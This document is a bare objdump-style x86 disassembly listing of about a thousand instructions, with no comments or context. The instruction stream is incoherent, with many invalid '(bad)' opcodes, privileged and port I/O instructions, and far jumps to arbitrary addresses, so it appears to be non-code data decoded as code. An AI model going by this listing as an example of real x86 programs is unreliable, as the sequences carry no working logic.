  4ac03a:	push   esi
  4ac03b:	fucomi st,st(4)
  4ac03d:	jmp    0x4ac04a
  4ac03f:	and    al,0xc6
  4ac041:	add    dl,BYTE PTR [esi+0x5c]
  4ac044:	popa   
  4ac045:	aaa    
  4ac046:	call   0x2ad9:0x88d38ba3
  4ac04d:	loope  0x4ac051
  4ac04f:	or     al,0x9a
  4ac051:	sub    al,0x61
  4ac053:	mov    bl,0xde
  4ac055:	rcl    DWORD PTR [eax],0x6
  4ac058:	xchg   ebx,eax
  4ac05a:	dec    edi
  4ac05b:	or     dh,BYTE PTR [ebp+0x35]
  4ac05e:	mov    esi,0xed3cffb6
  4ac063:	shr    eax,0xa
  4ac066:	add    al,0x1f
  4ac068:	int3   
  4ac069:	loop   0x4ac044
  4ac06b:	ficomp WORD PTR [ecx+eax*1]
  4ac06e:	and    ebp,esi
  4ac070:	shl    cl,1
  4ac072:	add    DWORD PTR [eiz*1+0x355d18b],0x58
  4ac07a:	and    eax,ebx
  4ac07c:	xlat   BYTE PTR ds:[ebx]
  4ac07d:	fld    QWORD PTR [edi+0x7442c5d8]
  4ac083:	outs   dx,DWORD PTR ds:[esi]
  4ac084:	or     eax,0x5721047e
  4ac089:	iret   
  4ac08a:	mov    ah,0x5
  4ac08c:	jo     0x4ac019
  4ac08e:	fisubr DWORD PTR [edi+0x75]
  4ac091:	add    cl,BYTE PTR [ecx-0x3cfd77db]
  4ac097:	rol    BYTE PTR [edi],0x50
  4ac09a:	jp     0x4ac0e4
  4ac09c:	push   DWORD PTR [ebx-0xfaf02d0]
  4ac0a2:	sar    dh,0xc8
  4ac0a5:	inc    ebp
  4ac0a6:	pop    ecx
  4ac0a7:	pop    ebp
  4ac0a8:	adc    eax,0x801acbd
  4ac0ad:	daa    
  4ac0ae:	and    al,0xb1
  4ac0b0:	rcr    DWORD PTR [ecx],1
  4ac0b2:	cld    
  4ac0b3:	loope  0x4ac038
  4ac0b5:	(bad)  
  4ac0b6:	dec    ebx
  4ac0b7:	call   DWORD PTR [ebx]
  4ac0b9:	push   edi
  4ac0ba:	icebp  
  4ac0bb:	das    
  4ac0bc:	cmp    DWORD PTR [ebp+0xa],0x793fb268
  4ac0c3:	jl     0x4ac0eb
  4ac0c5:	mov    edx,DWORD PTR [eax]
  4ac0c7:	dec    eax
  4ac0c8:	pop    es
  4ac0c9:	and    BYTE PTR [eax+0x30],bh
  4ac0cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4ac0cd:	fadd   DWORD PTR [eax-0x62]
  4ac0d0:	add    ebx,edi
  4ac0d2:	jo     0x4ac0a9
  4ac0d4:	sbb    DWORD PTR [esi-0x75fe3920],eax
  4ac0da:	mov    ah,0xa1
  4ac0dc:	in     al,dx
  4ac0dd:	add    eax,0x407d33ca
  4ac0e2:	js     0x4ac0ef
  4ac0e4:	mov    dh,BYTE PTR [edx-0x20]
  4ac0e7:	push   ebx
  4ac0e8:	mov    ebx,0x2f05be41
  4ac0ed:	fidivr DWORD PTR [ecx]
  4ac0ef:	je     0x4ac165
  4ac0f1:	jo     0x4ac0b0
  4ac0f3:	daa    
  4ac0f4:	pusha  
  4ac0f5:	dec    eax
  4ac0f6:	gs nop
  4ac0f8:	push   ds
  4ac0f9:	xchg   ebp,eax
  4ac0fa:	push   edx
  4ac0fb:	pop    es
  4ac0fc:	pop    edi
  4ac0fd:	outs   dx,DWORD PTR ds:[esi]
  4ac0fe:	das    
  4ac0ff:	popf   
  4ac100:	jmp    0x4ac108
  4ac102:	lods   eax,DWORD PTR ds:[esi]
  4ac103:	or     esp,ebp
  4ac105:	jl     0x4ac0f3
  4ac107:	ins    DWORD PTR es:[edi],dx
  4ac108:	xor    BYTE PTR [ebx-0x40],cl
  4ac10b:	mov    eax,0xf40a1388
  4ac110:	mov    ebx,0xda60e978
  4ac115:	sub    esp,DWORD PTR [esi-0x14f89077]
  4ac11b:	adc    bh,cl
  4ac11d:	push   ss
  4ac11e:	in     al,dx
  4ac11f:	cmp    ah,dh
  4ac121:	add    ebx,DWORD PTR [ecx-0x34db2057]
  4ac127:	jbe    0x4ac175
  4ac129:	push   es
  4ac12a:	sbb    esp,DWORD PTR [ecx-0x21]
  4ac12d:	fstp   DWORD PTR [edi+0x550cdaa1]
  4ac133:	adc    eax,DWORD PTR [ebx-0x61]
  4ac136:	loopne 0x4ac15d
  4ac138:	add    DWORD PTR [eax],ebp
  4ac13a:	cmp    bh,BYTE PTR [esi+0x7541d230]
  4ac140:	push   ds
  4ac141:	loopne 0x4ac146
  4ac143:	loope  0x4ac0d1
  4ac145:	pop    edi
  4ac146:	mov    BYTE PTR [eax-0x30],al
  4ac149:	add    DWORD PTR [ebx+ebp*8],eax
  4ac14c:	ds jmp 0x3315:0x399cfe00
  4ac154:	cmp    al,0x27
  4ac156:	xchg   BYTE PTR [eax+ecx*2],dh
  4ac159:	test   al,0x3d
  4ac15b:	shl    BYTE PTR [eax+eax*8-0x20b86ffc],1
  4ac162:	xchg   esi,eax
  4ac163:	imul   esi,DWORD PTR [ecx-0x36],0xffffffef
  4ac167:	lock sbb DWORD PTR [esi+0x3c],edx
  4ac16b:	retf   0x4977
  4ac16e:	call   0x115d3433
  4ac173:	cmp    al,0xc0
  4ac175:	bound  ebp,QWORD PTR [ebp+0x19]
  4ac178:	pusha  
  4ac179:	je     0x4ac1af
  4ac17b:	jne    0x4ac107
  4ac17d:	push   0x29ac8381
  4ac182:	imul   esp,DWORD PTR [eax+eax*8-0x4f93fa1f],0x59772c76
  4ac18d:	cmp    BYTE PTR [edi+0x2],ch
  4ac190:	rcr    BYTE PTR [eax+esi*8+0xc3b5f6b],cl
  4ac197:	mov    BYTE PTR [ecx],0x28
  4ac19a:	add    eax,0x7261290e
  4ac19f:	jb     0x4ac213
  4ac1a1:	sub    ch,BYTE PTR [ebx]
  4ac1a3:	inc    edx
  4ac1a4:	int    0xcd
  4ac1a6:	int    0xad
  4ac1a8:	add    BYTE PTR [ebx+0x8],dh
  4ac1ab:	inc    esp
  4ac1ac:	jmp    0x4ac21c
  4ac1ae:	inc    ebp
  4ac1af:	jmp    0x4ac21a
  4ac1b1:	xor    eax,0x783664eb
  4ac1b6:	ret    0xcdcd
  4ac1b9:	jmp    0x4ac21a
  4ac1bb:	aaa    
  4ac1bc:	jmp    0x4ac218
  4ac1be:	cmp    bl,ch
  4ac1c0:	push   ebp
  4ac1c1:	dec    DWORD PTR [edx]
  4ac1c3:	pop    ds
  4ac1c4:	mov    ecx,0x28f6f84c
  4ac1c9:	les    ebp,FWORD PTR [edx+0x3]
  4ac1cc:	ins    DWORD PTR es:[edi],dx
  4ac1cd:	imul   eax,edx,0x1acc05bb
  4ac1d3:	push   ecx
  4ac1d4:	push   esp
  4ac1d5:	add    ecx,DWORD PTR [eax-0x3c]
  4ac1d8:	jmp    0xc670:0x2670869d
  4ac1df:	add    bl,BYTE PTR [ebp-0x3a]
  4ac1e2:	fsubr  QWORD PTR [edi+0x552ca1b9]
  4ac1e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4ac1e9:	add    al,0x5
  4ac1eb:	xor    al,0x88
  4ac1ed:	inc    edx
  4ac1ee:	add    DWORD PTR [ecx+ecx*1-0x5f],ebx
  4ac1f2:	or     BYTE PTR [edi],ah
  4ac1f4:	push   edi
  4ac1f5:	xchg   edx,eax
  4ac1f6:	inc    esp
  4ac1f7:	add    eax,0x45dceba4
  4ac1fc:	test   eax,esp
  4ac1fe:	les    esp,FWORD PTR fs:[edi-0xfdbb156]
  4ac205:	inc    esp
  4ac206:	xchg   BYTE PTR [ebx],al
  4ac208:	mov    es,eax
  4ac20a:	aam    0x43
  4ac20c:	push   ds
  4ac20d:	adc    ah,0x18
  4ac210:	sub    BYTE PTR [edi+ebx*2+0x4501a825],ah
  4ac217:	cmp    BYTE PTR [esp+eax*4+0x4acab385],ch
  4ac21e:	lea    ebp,[ecx+0x23]
  4ac221:	pusha  
  4ac222:	in     eax,dx
  4ac223:	push   eax
  4ac224:	shl    BYTE PTR [esi],cl
  4ac226:	in     al,0x62
  4ac228:	mov    ah,0xa
  4ac22a:	add    dh,BYTE PTR [eax-0x26]
  4ac22d:	das    
  4ac22e:	dec    eax
  4ac22f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ac230:	in     al,0x80
  4ac232:	cmp    bh,BYTE PTR [edx]
  4ac234:	inc    eax
  4ac235:	xchg   edx,eax
  4ac236:	je     0x4ac2a0
  4ac238:	test   BYTE PTR ds:0x7a945091,ah
  4ac23e:	xchg   esi,eax
  4ac23f:	push   edx
  4ac240:	iret   
  4ac241:	xchg   esi,eax
  4ac242:	jae    0x4ac275
  4ac244:	push   esp
  4ac245:	pusha  
  4ac246:	stos   DWORD PTR es:[edi],eax
  4ac247:	add    al,0x9a
  4ac249:	or     bl,dh
  4ac24b:	jo     0x4ac292
  4ac24d:	pop    eax
  4ac24e:	aas    
  4ac24f:	cmp    ch,BYTE PTR [ecx]
  4ac251:	hlt    
  4ac252:	fiadd  WORD PTR [esi]
  4ac254:	mov    esp,0xe8322475
  4ac259:	aad    0x42
  4ac25b:	les    edi,FWORD PTR [ecx+0x692f15f]
  4ac261:	jne    0x4ac29b
  4ac263:	pop    edi
  4ac264:	jne    0x4ac269
  4ac266:	inc    edi
  4ac267:	jmp    0x4ac254
  4ac269:	dec    ebx
  4ac26a:	je     0x4ac1f3
  4ac26c:	sub    eax,0xe0322b58
  4ac271:	push   esi
  4ac272:	sub    DWORD PTR [eax-0x7d187bb6],esi
  4ac278:	test   ch,dl
  4ac27a:	mov    edi,0xb7086f40
  4ac27f:	mov    edx,0x750766bb
  4ac284:	sbb    BYTE PTR [esi],dh
  4ac286:	push   esi
  4ac287:	hlt    
  4ac288:	inc    ebp
  4ac289:	pop    eax
  4ac28a:	add    eax,0xb31978
  4ac28f:	pop    es
  4ac290:	sub    BYTE PTR [ecx],ch
  4ac292:	test   al,0x71
  4ac294:	sub    al,0xf4
  4ac296:	add    ch,bl
  4ac298:	test   BYTE PTR [edi-0x7e015fbc],ah
  4ac29e:	jmp    FWORD PTR [esi+edi*4+0x66c00173]
  4ac2a5:	sar    BYTE PTR [edx+ebp*2-0x15],cl
  4ac2a9:	rol    edi,0x34
  4ac2ac:	jne    0x4ac255
  4ac2ae:	or     cl,BYTE PTR [ebp-0x7cc980c4]
  4ac2b4:	jecxz  0x4ac2c1
  4ac2b6:	adc    bl,bh
  4ac2b8:	mov    edi,0x75743444
  4ac2bd:	push   eax
  4ac2be:	mov    DWORD PTR [esi+0x50],0x1cc3781
  4ac2c5:	sbb    DWORD PTR [eax],ebx
  4ac2c7:	jmp    0x1025:0x5488a75
  4ac2ce:	gs pop eax
  4ac2d0:	fimul  WORD PTR [edx+0x4569450]
  4ac2d6:	sub    dh,al
  4ac2d8:	add    al,0xb2
  4ac2da:	xor    al,ch
  4ac2dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ac2dd:	jle    0x4ac2c9
  4ac2df:	mov    ch,0xaf
  4ac2e1:	cmp    ebp,DWORD PTR [ecx+0x3c]
  4ac2e4:	add    eax,0x23a83512
  4ac2e9:	ja     0x4ac309
  4ac2eb:	sbb    DWORD PTR [esi-0x41f887c4],esp
  4ac2f1:	sbb    bl,BYTE PTR [edi+0x6d]
  4ac2f4:	ret    
  4ac2f5:	and    dh,dl
  4ac2f7:	dec    eax
  4ac2f8:	add    al,0x8a
  4ac2fa:	ror    DWORD PTR [ecx+0x66],cl
  4ac2fd:	xchg   ecx,eax
  4ac2fe:	jbe    0x4ac2a6
  4ac300:	in     eax,dx
  4ac301:	or     ebp,DWORD PTR [edx]
  4ac303:	test   dh,bh
  4ac305:	retf   0xeb0d
  4ac308:	push   eax
  4ac309:	je     0x4ac353
  4ac30b:	push   esi
  4ac30c:	in     al,dx
  4ac30d:	xchg   ebx,eax
  4ac30e:	retf   0x11e4
  4ac311:	dec    eax
  4ac312:	jno    0x4ac389
  4ac314:	sbb    ebp,DWORD PTR [ebp-0xc]
  4ac317:	add    eax,0x2418149e
  4ac31c:	call   0x3d890671
  4ac321:	push   es
  4ac322:	iret   
  4ac323:	lsl    ebx,WORD PTR [ebp-0x14]
  4ac327:	fdiv   DWORD PTR [edx+eiz*8]
  4ac32a:	hlt    
  4ac32b:	or     DWORD PTR [ebx],esp
  4ac32d:	push   ds
  4ac32e:	sbb    ebx,0xec0fe398
  4ac334:	jle    0x4ac372
  4ac336:	dec    ebp
  4ac337:	xor    BYTE PTR [esi+eax*2-0x791c7aa0],0x62
  4ac33f:	ins    DWORD PTR es:[edi],dx
  4ac340:	jmp    0xc8d5:0x4728d285
  4ac347:	xor    eax,0x5caabeb0
  4ac34c:	fist   WORD PTR [ebx+ebx*2]
  4ac34f:	ja     0xcfa3cc0a
  4ac355:	xchg   BYTE PTR [ecx],bl
  4ac357:	cmp    BYTE PTR [edi],bl
  4ac359:	or     DWORD PTR [ebp+0x3d153593],0x42
  4ac360:	ret    0xe9b7
  4ac363:	cwde   
  4ac364:	and    esp,esp
  4ac366:	in     eax,0x18
  4ac368:	xchg   DWORD PTR [ecx],ebp
  4ac36a:	jne    0x4ac35e
  4ac36c:	es push ebp
  4ac36e:	add    dl,BYTE PTR [edx]
  4ac370:	sbb    eax,0x703120f8
  4ac375:	in     al,0xed
  4ac377:	push   0xffffff98
  4ac379:	and    BYTE PTR es:[esi+0x59a08801],bh
  4ac380:	test   al,0xcb
  4ac382:	hlt    
  4ac383:	pop    esi
  4ac384:	mov    esi,DWORD PTR [esi-0xe1f0fa3]
  4ac38a:	arpl   WORD PTR [ebx+ecx*1+0x60303f1a],di
  4ac391:	pop    esi
  4ac392:	jp     0x11b8c5df
  4ac398:	xchg   ebp,eax
  4ac399:	and    BYTE PTR [edx],cl
  4ac39b:	loope  0x4ac3c1
  4ac39d:	mov    eax,0xddfa3831
  4ac3a2:	cmp    al,0x3c
  4ac3a4:	je     0x4ac37f
  4ac3a6:	and    BYTE PTR [esp+edi*2+0x12],0x23
  4ac3ab:	dec    ebp
  4ac3ac:	cmp    BYTE PTR [eax],ah
  4ac3ae:	xor    dl,BYTE PTR [ebx]
  4ac3b0:	add    ah,0xe
  4ac3b3:	and    DWORD PTR [esi+0xb33523c],edi
  4ac3b9:	(bad)  
  4ac3ba:	icebp  
  4ac3bb:	sub    BYTE PTR [edx],al
  4ac3bd:	lock add ah,BYTE PTR es:[esi+ecx*1+0x4c]
  4ac3c3:	shr    BYTE PTR [ebp-0x6b],0xce
  4ac3c7:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ac3c9:	jmp    0x4ac406
  4ac3cb:	ins    BYTE PTR es:[edi],dx
  4ac3cc:	jne    0x4ac3db
  4ac3ce:	inc    edi
  4ac3cf:	xor    ebp,edx
  4ac3d1:	aaa    
  4ac3d2:	mov    dh,0xe3
  4ac3d4:	ficomp WORD PTR [esi+0x3a]
  4ac3d7:	sub    al,ah
  4ac3d9:	and    esp,esi
  4ac3db:	aad    0xb3
  4ac3dd:	retf   0x1958
  4ac3e0:	pop    ss
  4ac3e1:	cmp    eax,0x2bf42d3c
  4ac3e6:	jne    0x4ac3f2
  4ac3e8:	pop    ss
  4ac3e9:	mov    ah,0xc2
  4ac3eb:	dec    ebp
  4ac3ec:	sbb    edx,DWORD PTR [edi]
  4ac3ee:	lods   al,BYTE PTR ds:[esi]
  4ac3ef:	pusha  
  4ac3f0:	mov    WORD PTR [ebx+0x47525af0],?
  4ac3f6:	xor    eax,0x91cb06d
  4ac3fb:	add    DWORD PTR ds:[ecx-0x56],edi
  4ac3ff:	push   ss
  4ac400:	adc    dh,ch
  4ac402:	adc    al,0x6e
  4ac404:	or     BYTE PTR ds:0xfc2974e0,bh
  4ac40a:	adc    eax,0xf08681f6
  4ac40f:	fist   DWORD PTR [eax]
  4ac411:	mov    eax,ds:0xc6423809
  4ac416:	(bad)  
  4ac417:	inc    edi
  4ac418:	inc    ecx
  4ac419:	shl    BYTE PTR ds:0x9c80323,1
  4ac41f:	aad    0xce
  4ac421:	xchg   bl,dl
  4ac423:	sub    bl,ah
  4ac425:	jne    0x4ac401
  4ac427:	pop    edx
  4ac428:	in     al,0x4d
  4ac42a:	loopne 0x4ac457
  4ac42c:	inc    ecx
  4ac42d:	out    dx,al
  4ac42e:	push   ds
  4ac42f:	pop    ebx
  4ac430:	and    al,0x7e
  4ac432:	shufps xmm0,XMMWORD PTR [ebx+0x75],0xda
  4ac437:	fnsave [edi-0x4bd67aea]
  4ac43d:	mov    cl,BYTE PTR [edi]
  4ac43f:	sbb    eax,DWORD PTR [eax+0x1a1c29f9]
  4ac445:	pop    ss
  4ac446:	add    al,0x7c
  4ac448:	push   ss
  4ac449:	sbb    esp,ebp
  4ac44b:	push   ebp
  4ac44c:	or     BYTE PTR [esi-0x43],dh
  4ac44f:	ficomp WORD PTR [ecx+eax*2-0x47]
  4ac453:	sbb    DWORD PTR [ecx],esi
  4ac455:	stc    
  4ac456:	sub    eax,0x21b79b46
  4ac45b:	adc    al,0x2a
  4ac45d:	xor    al,0x8d
  4ac45f:	into   
  4ac460:	add    eax,DWORD PTR [esi+0x2]
  4ac463:	adc    al,0x7e
  4ac465:	mov    edx,0x3b163334
  4ac46a:	inc    esi
  4ac46b:	cmp    BYTE PTR [esi+0x68],bh
  4ac46e:	inc    edx
  4ac46f:	pushf  
  4ac470:	xchg   esp,eax
  4ac471:	adc    BYTE PTR [edi],dl
  4ac473:	add    al,0xd0
  4ac475:	inc    ebx
  4ac476:	add    eax,0x187b6abc
  4ac47b:	scas   eax,DWORD PTR es:[edi]
  4ac47c:	cmp    DWORD PTR [esi+0x2c],0x32
  4ac480:	jle    0x4ac4aa
  4ac482:	lods   eax,DWORD PTR ds:[esi]
  4ac483:	jle    0x4ac4b2
  4ac485:	push   eax
  4ac486:	cmp    BYTE PTR [eax+0x60],bl
  4ac489:	fstp   QWORD PTR [esi]
  4ac48b:	loopne 0x4ac4d3
  4ac48d:	pop    esp
  4ac48e:	xchg   ebx,eax
  4ac48f:	test   eax,0x494a026a
  4ac494:	paddd  mm2,QWORD PTR [edx]
  4ac497:	outs   dx,BYTE PTR ds:[esi]
  4ac498:	or     edx,esp
  4ac49a:	add    edi,DWORD PTR [esi+0x30]
  4ac49d:	das    
  4ac49e:	inc    esi
  4ac49f:	sub    al,0x7c
  4ac4a1:	shl    DWORD PTR [ecx-0x10],0xa6
  4ac4a5:	sbb    BYTE PTR [esi],cl
  4ac4a7:	push   esi
  4ac4a8:	sub    al,0x7d
  4ac4aa:	and    eax,0xf42a2b9e
  4ac4af:	ret    0xe87d
  4ac4b2:	sar    DWORD PTR [ebp+eax*1+0x7031dafe],0xd0
  4ac4ba:	ficom  DWORD PTR [ebx+0x4]
  4ac4bd:	shl    DWORD PTR [esi+eax*4+0x10],cl
  4ac4c1:	(bad)  
  4ac4c2:	das    
  4ac4c3:	pusha  
  4ac4c4:	push   ebp
  4ac4c5:	loopne 0x4ac4b5
  4ac4c7:	fcom   DWORD PTR [ecx-0x50]
  4ac4ca:	mov    dl,0xa
  4ac4cc:	jg     0x4ac49a
  4ac4ce:	push   edi
  4ac4cf:	push   edx
  4ac4d0:	push   esi
  4ac4d1:	adc    dl,dh
  4ac4d3:	(bad)  
  4ac4d4:	jle    0x4ac4ef
  4ac4d6:	nop
  4ac4d7:	dec    edx
  4ac4d8:	add    eax,0x496e4377
  4ac4dd:	or     dl,bh
  4ac4df:	lea    edi,[edx]
  4ac4e1:	icebp  
  4ac4e2:	pop    edi
  4ac4e3:	pop    esp
  4ac4e4:	jl     0x4ac54a
  4ac4e6:	scas   al,BYTE PTR es:[edi]
  4ac4e7:	loop   0x4ac4a0
  4ac4e9:	mov    dl,0xa5
  4ac4eb:	push   edx
  4ac4ec:	out    dx,eax
  4ac4ed:	cmp    edi,ecx
  4ac4ef:	jle    0x4ac51b
  4ac4f1:	jmp    0x4ac4fa
  4ac4f3:	or     DWORD PTR ds:0xe01f3e14,ecx
  4ac4f9:	or     BYTE PTR [ecx],dl
  4ac4fb:	xor    ecx,DWORD PTR [ebx-0x38]
  4ac4fe:	add    BYTE PTR [ecx],al
  4ac500:	sbb    dl,BYTE PTR [esi+eax*8+0x6f]
  4ac504:	add    BYTE PTR [ebx+esi*1-0x1f8330c5],0x60
  4ac50c:	xor    BYTE PTR [eax+0x48],bl
  4ac50f:	inc    ebx
  4ac510:	push   0x9c875d09
  4ac515:	(bad)  
  4ac516:	sbb    eax,0x298effc6
  4ac51b:	ins    BYTE PTR es:[edi],dx
  4ac51c:	xchg   edx,eax
  4ac51d:	push   0xffffffe0
  4ac51f:	push   edi
  4ac520:	push   0x1652e2ac
  4ac525:	push   ebx
  4ac526:	xor    DWORD PTR [edx-0x56973df4],eax
  4ac52c:	cdq    
  4ac52d:	loopne 0x4ac56b
  4ac52f:	fld    DWORD PTR [ecx+0x70]
  4ac532:	rol    DWORD PTR [eax],0xf
  4ac535:	test   DWORD PTR [esi],0xb044e8d8
  4ac53b:	repz in eax,dx
  4ac53d:	mov    ecx,0x69eba758
  4ac542:	sbb    eax,0x8fb80584
  4ac547:	sub    BYTE PTR [ebp+0x19],dh
  4ac54a:	pop    ds
  4ac54b:	jae    0x4ac52f
  4ac54d:	xchg   DWORD PTR [eax],edi
  4ac54f:	and    eax,0x439a59b9
  4ac554:	mov    cl,BYTE PTR [edi+0x1]
  4ac557:	mov    DWORD PTR [eax],edx
  4ac559:	pop    ecx
  4ac55a:	xchg   ecx,eax
  4ac55b:	fidiv  WORD PTR [edx-0x163bf7d0]
  4ac561:	push   eax
  4ac562:	add    bl,BYTE PTR [edx]
  4ac564:	mov    ds:0x4e11d464,al
  4ac569:	xor    eax,0xc6b3ee88
  4ac56e:	outs   dx,BYTE PTR ds:[esi]
  4ac56f:	push   cs
  4ac570:	dec    edx
  4ac571:	stos   DWORD PTR es:[edi],eax
  4ac572:	cdq    
  4ac573:	mov    ebp,0x19e1f7f5
  4ac578:	outs   dx,BYTE PTR ds:[esi]
  4ac579:	loop   0x4ac5a0
  4ac57b:	mov    ecx,0x5bb9fb5a
  4ac580:	mov    eax,0xcb6784a9
  4ac585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4ac586:	mov    ch,0x88
  4ac588:	inc    ebx
  4ac589:	or     eax,0x501e8e93
  4ac58e:	sub    al,cl
  4ac590:	sub    dl,BYTE PTR [ebx+0x18]
  4ac593:	repnz enter 0xc223,0x32
  4ac598:	in     eax,dx
  4ac599:	jecxz  0x4ac526
  4ac59b:	inc    edx
  4ac59c:	(bad)  
  4ac59d:	stc    
  4ac59e:	push   0x5a
  4ac5a0:	lods   al,BYTE PTR ds:[esi]
  4ac5a1:	cmc    
  4ac5a2:	std    
  4ac5a3:	sbb    al,0x6c
  4ac5a5:	mov    edx,0xec5b1105
  4ac5aa:	add    eax,0x1de7c914
  4ac5af:	inc    edi
  4ac5b0:	lock loopne 0x4ac549
  4ac5b3:	inc    edx
  4ac5b4:	sub    BYTE PTR [ebp-0x64],bl
  4ac5b7:	xchg   esp,eax
  4ac5b8:	jmp    0x4ac570
  4ac5ba:	(bad)  
  4ac5bb:	call   0xee7556e5
  4ac5c0:	xlat   BYTE PTR ds:[ebx]
  4ac5c1:	dec    ecx
  4ac5c2:	sub    BYTE PTR [edx],dl
  4ac5c4:	adc    dh,BYTE PTR [edi-0x1bb738c6]
  4ac5ca:	add    al,0xc1
  4ac5cc:	loope  0x4ac557
  4ac5ce:	je     0x4ac584
  4ac5d0:	rcr    BYTE PTR [ebx-0x4a],0xd3
  4ac5d4:	dec    ebx
  4ac5d5:	inc    edi
  4ac5d6:	jne    0x4ac5c1
  4ac5d8:	sbb    DWORD PTR [eax+edi*1],ecx
  4ac5db:	or     eax,0xb77c1a96
  4ac5e0:	pop    edx
  4ac5e1:	sbb    BYTE PTR [ecx-0x7fabe920],dl
  4ac5e7:	dec    esp
  4ac5e8:	rcr    BYTE PTR [edi+0x75],0xd1
  4ac5ec:	add    eax,ecx
  4ac5ee:	inc    ecx
  4ac5ef:	sub    DWORD PTR [eax+0x562afc55],eax
  4ac5f5:	sbb    BYTE PTR [edx+0x3e0f8684],cl
  4ac5fb:	inc    dl
  4ac5fd:	xchg   ch,bh
  4ac5ff:	fdivr  st,st(6)
  4ac601:	mov    ecx,0x2d01c316
  4ac606:	dec    ebp
  4ac607:	scas   eax,DWORD PTR es:[edi]
  4ac608:	jp     0x4ac604
  4ac60a:	lock push edi
  4ac60c:	(bad)  
  4ac60d:	xor    al,0x3c
  4ac60f:	ds je  0x4ac631
  4ac612:	and    BYTE PTR [edi+ebp*8-0x6dba88e1],al
  4ac619:	jmp    0xbab7efe5
  4ac61e:	and    eax,0x3ef2161f
  4ac623:	jp     0x4ac60e
  4ac625:	xchg   ecx,eax
  4ac626:	and    BYTE PTR [eax],al
  4ac628:	xchg   edx,eax
  4ac629:	loop   0x4ac677
  4ac62b:	aad    0x6a
  4ac62d:	pop    es
  4ac62e:	push   cs
  4ac62f:	shl    cl,1
  4ac631:	scas   al,BYTE PTR es:[edi]
  4ac632:	sub    BYTE PTR [eax],al
  4ac634:	sbb    eax,0xf0894c04
  4ac639:	ret    0x4ba1
  4ac63c:	pop    eax
  4ac63d:	mov    ch,0x9f
  4ac63f:	sti    
  4ac640:	and    dl,BYTE PTR [eax]
  4ac642:	(bad)  
  4ac644:	and    BYTE PTR [edx],bl
  4ac646:	pop    ss
  4ac647:	sar    ebx,0x39
  4ac64a:	dec    ebp
  4ac64b:	sub    BYTE PTR [eax+ecx*2-0x46],dh
  4ac64f:	push   esp
  4ac650:	lods   eax,DWORD PTR ds:[esi]
  4ac651:	pop    es
  4ac652:	into   
  4ac653:	cmp    ecx,DWORD PTR [ebp-0x10]
  4ac656:	pop    ebx
  4ac657:	pop    eax
  4ac658:	cmp    DWORD PTR [edx-0x67679651],0x658d0ff0
  4ac662:	sbb    al,ah
  4ac664:	jo     0x4ac678
  4ac666:	sub    BYTE PTR [eax+0x3],al
  4ac669:	xor    al,0x46
  4ac66b:	imul   ebp,DWORD PTR [edx],0x894aa7d8
  4ac671:	adc    al,dh
  4ac673:	push   ss
  4ac674:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4ac676:	dec    edx
  4ac677:	add    eax,ecx
  4ac679:	push   ebx
  4ac67a:	xor    BYTE PTR [ebx+0x56],al
  4ac67d:	sub    BYTE PTR [ebx-0x47e57b1f],ch
  4ac683:	mov    edx,0x364e3922
  4ac688:	inc    ebx
  4ac689:	js     0x4ac641
  4ac68b:	sub    al,0x56
  4ac68d:	xchg   esp,eax
  4ac68e:	add    dl,bh
  4ac690:	repz xor al,dl
  4ac693:	add    BYTE PTR [ebp+0x69925071],bl
  4ac699:	pop    ebx
  4ac69a:	jp     0x4ac713
  4ac69c:	pop    ebx
  4ac69d:	xor    DWORD PTR [esi],0x2e
  4ac6a0:	sub    BYTE PTR [eax+eax*4],0x83
  4ac6a4:	or     eax,DWORD PTR [eax+0x75]
  4ac6a7:	or     al,0x7
  4ac6a9:	sub    al,BYTE PTR [eax-0x57]
  4ac6ac:	mov    BYTE PTR [edi-0x76],ch
  4ac6af:	shl    BYTE PTR [ebp+eiz*4-0x32d63fa4],1
  4ac6b6:	cmp    edx,eax
  4ac6b8:	ret    
  4ac6b9:	outs   dx,DWORD PTR es:[esi]
  4ac6bb:	cld    
  4ac6bc:	xor    al,0xf8
  4ac6be:	out    0xc,eax
  4ac6c0:	jg     0x4ac724
  4ac6c2:	xor    BYTE PTR [ecx+ebp*4-0x22],ah
  4ac6c6:	js     0x4ac6e2
  4ac6c8:	cmp    eax,0x29254899
  4ac6cd:	mov    esp,0x98a113f2
  4ac6d2:	dec    eax
  4ac6d3:	push   0x408835d4
  4ac6d8:	sub    eax,DWORD PTR [edi+ebp*4]
  4ac6db:	lods   eax,DWORD PTR ds:[esi]
  4ac6dc:	shr    BYTE PTR [esi-0x70],cl
  4ac6df:	jmp    0xb40f:0xc165f803
  4ac6e6:	and    dh,BYTE PTR [eax-0x28]
  4ac6e9:	int3   
  4ac6ea:	inc    esi
  4ac6eb:	dec    edx
  4ac6ec:	inc    esi
  4ac6ed:	sub    dl,bh
  4ac6ef:	pop    eax
  4ac6f0:	dec    ebp
  4ac6f1:	jmp    0x4ac9:0x367e4983
  4ac6f8:	add    DWORD PTR [esp+ebp*2],0xffffffaa
  4ac6fc:	je     0x4ac71b
  4ac6fe:	mov    bl,0x8
  4ac700:	ja     0x4ac6ab
  4ac702:	inc    ebp
  4ac703:	ds xor al,0x41
  4ac706:	sahf   
  4ac707:	(bad)  
  4ac708:	out    0xb0,al
  4ac70a:	jns    0x4ac6f9
  4ac70c:	addr16 cld 
  4ac70e:	add    DWORD PTR [ecx+0x3],ecx
  4ac711:	stos   BYTE PTR es:[edi],al
  4ac712:	inc    ecx
  4ac713:	push   0x3b
  4ac715:	jl     0x4ac6e8
  4ac717:	test   eax,0x500d0a42
  4ac71c:	push   esp
  4ac71d:	in     al,0x42
  4ac71f:	mov    ecx,0x5dd8207e
  4ac724:	pop    ss
  4ac725:	mov    bl,BYTE PTR [esi-0x46]
  4ac728:	inc    al
  4ac72a:	push   ecx
  4ac72b:	mov    BYTE PTR [esi+0x7c4fa1d5],al
  4ac731:	out    0x4b,eax
  4ac733:	and    al,BYTE PTR [esp+eax*1-0x51]
  4ac737:	mov    eax,ds:0xffd90a26
  4ac73c:	cmp    al,0x9f
  4ac73e:	inc    esi
  4ac73f:	xlat   BYTE PTR ds:[ebx]
  4ac740:	sub    al,0x9
  4ac742:	or     al,0x34
  4ac744:	js     0x4ac772
  4ac746:	iret   
